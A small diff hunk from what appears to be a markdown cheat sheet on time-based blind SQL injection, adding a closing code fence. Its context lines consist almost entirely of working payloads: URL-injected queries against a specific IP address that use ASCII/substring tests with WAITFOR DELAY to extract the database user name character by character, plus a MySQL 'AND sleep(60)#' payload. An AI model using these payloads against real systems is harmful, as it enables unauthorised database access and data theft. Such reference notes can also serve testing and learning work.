@@ -15,7 +15,7 @@ http://45.77.162.239/book.php?id=2; IF (ASCII(lower(substring((USER),1,1)))=100)
 #To Identify 2nd Character
 http://45.77.162.239/book.php?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--   
 http://45.77.162.239/book.php?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--   
-
+```
 ### Timbe  SQL Injection sleep operator
 ```
 iron man 'AND sleep(60)#
